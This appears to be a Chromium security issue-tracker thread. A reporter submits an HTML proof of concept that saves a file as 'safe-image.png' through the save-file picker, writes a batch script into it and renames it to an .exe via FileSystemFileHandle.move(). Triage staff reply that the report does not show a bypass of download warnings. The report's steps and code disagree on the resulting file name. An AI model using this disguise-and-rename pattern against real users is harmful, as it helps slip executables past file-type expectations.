@@ -1,0 +1,145 @@
+Issue ID: 466288823
+
+Author: ch...@google.com
+<p>Please see our FAQ entry <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#i-can-download-a-file-with-an-unsafe-extension-and-it-is-not-classified-as-dangerous-is-this-a-security-bug" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#i-can-download-a-file-with-an-unsafe-extension-and-it-is-not-classified-as-dangerous-is-this-a-security-bug" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/main/docs/security/faq.md%23i-can-download-a-file-with-an-unsafe-extension-and-it-is-not-classified-as-dangerous-is-this-a-security-bug&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw171HXnYkkreJxGsBs2nioC">https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#i-can-download-a-file-with-an-unsafe-extension-and-it-is-not-classified-as-dangerous-is-this-a-security-bug</a>. A zip file is generally safe, so this report does not demonstrate that your are bypassing download restrictions. A good demonstration of bypassing the restrictions would be to show that without using this technique, Chrome does warn for a download, and then with this technique it doesn&#39;t warn.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: ch...@google.com
+google_domain
+
+Author: # Steps to reproduce the problem
+1. host file 
+```<!DOCTYPE html>
+<html>
+<head>
+<title>File Save Test</title>
+</head>
+<body>
+<button onclick="testVulnerability()">Test Save File Picker</button>
+
+<script>
+async function testVulnerability() {
+    try {
+        console.log("[TEST] Memulai exploit simulation...");
+
+        // Step 1: Trigger save file picker dengan nama yang tidak mencurigakan
+        const fileHandle = await window.showSaveFilePicker({
+            suggestedName: `safe-image.png`,
+            startIn: "desktop",
+            types: [{
+                description: 'Image File',
+                accept: {
+                    'image/png': ['.png']
+                },
+            }],
+        });
+
+        console.log("[TEST] File handle obtained:", fileHandle.name);
+
+        // Step 2: Create writable stream
+        const writableStream = await fileHandle.createWritable();
+
+        // Step 3: Write malicious content (simulasi batch file)
+        const batchContent = `@echo off\necho This is a test batch file for security testing\necho Vulnerability Confirmed\npause`;
+        await writableStream.write(new TextEncoder().encode(batchContent));
+        await writableStream.close();
+
+        console.log("[TEST] File written successfully");
+
+        // Step 4: Rename to executable-like file (simulasi exploit)
+        try {
+            await fileHandle.move("test-exploit.exe");
+            console.log("[TEST] SUCCESS: File renamed to test-exploit.exe");
+            console.log("[TEST] VULNERABILITY CONFIRMED: File type bypass working");
+        } catch (moveError) {
+            console.log("[TEST] FAILED: Move operation blocked:", moveError);
+        }
+
+    } catch (error) {
+        console.log("[TEST] Error during process:", error);
+    }
+}
+
+// Alternative test dengan simulasi yang lebih aman
+async function safeTest() {
+    try {
+        // Test dengan direktori downloads yang lebih aman
+        const fileHandle = await window.showSaveFilePicker({
+            suggestedName: `test-file.txt`,
+            types: [{
+                description: 'Text File',
+                accept: {'text/plain': ['.txt']}
+            }],
+        });
+
+        const writable = await fileHandle.createWritable();
+        await writable.write(new TextEncoder().encode('Security test content'));
+        await writable.close();
+
+        console.log("[SAFE TEST] File saved normally");
+
+    } catch (error) {
+        console.log("[SAFE TEST] Canceled or error:", error);
+    }
+}
+</script>
+</body>
+</html>
+```
+2. click Test File Picker
+3. A pop-up message appears indicating that you want to save the safe-image.png file.
+4. Click Save and see that the saved file is malicious.zip.
+
+# Problem Description
+The FileSystemFileHandle.move() method can bypass download restrictions and file type validation, allowing attackers to save executable files after users approve non-suspicious file types.
+
+# Summary
+Change the downloaded file extension after displaying the safe file
+
+# Additional Data
+Category: Security \
+Chrome Channel: Not sure \
+Regression: Yes \
+Has Chrome Feedback with description matching the bug title: https://listnr.corp.google.com/product/237/reports?searchText=Change%20the%20downloaded%20file%20extension%20after%20displaying%20the%20safe%20file&filter=0&dateRange=30
+WW1Gak16VTJaalEyT0RGak1HTm1aams0TmpKaE9HVmlNMkZrTldZNVkyUT0=
+
+Author: cy...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: cy...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: cy...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: cy...@gmail.com
+Wm1Zd05tWTBNRFF6TUdNell6ZGhaRE13WlRoaE5tVmhNV05oTURreU5qTT0=
+
+Author: cy...@gmail.com
+TkRZMk1qZzRPREl6TFRjeE5UUTJNalF3TFMweU1qQXhOakkwTWprPQ==
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: nobody@google.com
+<p>Please see our FAQ entry <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#i-can-download-a-file-with-an-unsafe-extension-and-it-is-not-classified-as-dangerous-is-this-a-security-bug" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#i-can-download-a-file-with-an-unsafe-extension-and-it-is-not-classified-as-dangerous-is-this-a-security-bug" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/main/docs/security/faq.md%23i-can-download-a-file-with-an-unsafe-extension-and-it-is-not-classified-as-dangerous-is-this-a-security-bug&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw171HXnYkkreJxGsBs2nioC">https://chromium.googlesource.com/chromium/src/+/main/docs/security/faq.md#i-can-download-a-file-with-an-unsafe-extension-and-it-is-not-classified-as-dangerous-is-this-a-security-bug</a>. A zip file is generally safe, so this report does not demonstrate that your are bypassing download restrictions. A good demonstration of bypassing the restrictions would be to show that without using this technique, Chrome does warn for a download, and then with this technique it doesn&#39;t warn.</p>
+
+Author: nobody@google.com
+[Deleted User]
+
+Author: nobody@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
